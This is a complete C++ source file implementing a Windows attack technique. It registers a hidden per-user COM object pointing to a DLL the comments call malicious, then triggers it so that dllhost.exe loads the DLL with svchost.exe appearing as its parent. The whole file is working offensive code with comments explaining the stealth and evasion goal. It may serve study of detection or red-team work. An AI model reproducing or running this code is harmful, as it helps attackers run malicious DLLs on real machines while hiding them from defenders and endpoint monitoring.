#include <windows.h>
#include <objbase.h>
#include <iostream>

// Custom CLSID for our malicious COM object
// This GUID will uniquely identify our COM object in the registry
static const wchar_t* CLSID_STR = L"{F00DBABA-2504-2025-2016-666699996666}";


//Helper function to write string values to Windows registry
bool SetRegStr(HKEY root, const std::wstring& key, const std::wstring& name, const std::wstring& val) {
    HKEY h;
    
    // Create or open the registry key with write permissions
    // REG_OPTION_VOLATILE means the key won't persist across reboots
    if (RegCreateKeyExW(root, key.c_str(), 0, nullptr, 
        REG_OPTION_VOLATILE, KEY_WRITE, nullptr, &h, nullptr) != ERROR_SUCCESS) {
        return false;
    }
    
    // Write the string value to the registry
    if (RegSetValueExW(h, 
        name.empty() ? nullptr : name.c_str(), 
        0, REG_SZ, 
        reinterpret_cast<const BYTE*>(val.c_str()), 
        DWORD((val.size() + 1) * sizeof(wchar_t))) != ERROR_SUCCESS) {
        RegCloseKey(h);
        return false;
    }
    
    RegCloseKey(h);
    return true;
}

int wmain() {
    // STEP 1: Create AppID registry entry for DLL Surrogate configuration
    // This tells Windows to use dllhost.exe as a surrogate process
    std::wstring appidKey = LR"(Software\Classes\AppID\)" + std::wstring(CLSID_STR);
    
    // Set default value and empty DllSurrogate (triggers default dllhost.exe)
    if (!SetRegStr(HKEY_CURRENT_USER, appidKey, L"", L"MyStealthObject") ||
        !SetRegStr(HKEY_CURRENT_USER, appidKey, L"DllSurrogate", L"")) {
        std::wcerr << L"[!] AppID registry failed\n";
        return 1;
    }

    // STEP 2: Create CLSID registry entries to define our COM object
    // This maps our CLSID to the malicious DLL and links it to the AppID
    std::wstring clsidKey = LR"(Software\Classes\CLSID\)" + std::wstring(CLSID_STR);
    std::wstring inprocKey = clsidKey + LR"(\InprocServer32)";
    
    if (!SetRegStr(HKEY_CURRENT_USER, clsidKey, L"", L"MyStealthObject") ||           // Object name
        !SetRegStr(HKEY_CURRENT_USER, clsidKey, L"AppID", CLSID_STR) ||              // Link to AppID
        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"", L"C:\\Users\\sample.dll") ||   // Path to malicious DLL
        !SetRegStr(HKEY_CURRENT_USER, inprocKey, L"ThreadingModel", L"Apartment")) { // COM threading model
        std::wcerr << L"[!] CLSID registry failed\n";
        return 1;
    }
    
    std::wcout << L"[+] Registry for COM surrogates created\n";

    // STEP 3: Initialize COM subsystem and trigger the injection
    // Initialize COM library for apartment-threaded model
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::wcerr << L"[!] CoInitializeEx: 0x" << std::hex << hr << L"\n";
        return 1;
    }

    // Convert string CLSID to binary format
    CLSID clsid;
    hr = CLSIDFromString(const_cast<LPWSTR>(CLSID_STR), &clsid);
    if (FAILED(hr)) {
        std::wcerr << L"[!] Invalid CLSID\n";
        return 1;
    }

    // THE MAGIC HAPPENS HERE!
    // CLSCTX_LOCAL_SERVER forces Windows to:
    // 1. Look up our CLSID in the registry
    // 2. Find the DllSurrogate entry
    // 3. Launch dllhost.exe as a surrogate process
    // 4. Load our malicious DLL into dllhost.exe
    // 5. The parent process appears as svchost.exe 
    IUnknown* p;
    hr = CoCreateInstance(clsid, nullptr, 
        CLSCTX_LOCAL_SERVER,  // KEY PARAMETER: Forces out-of-process execution
        IID_IUnknown, 
        (void**)&p);

    // Clean up COM subsystem
    CoUninitialize();
    
    // At this point, our DLL is running in dllhost.exe with svchost.exe as parent
    return 0;
}
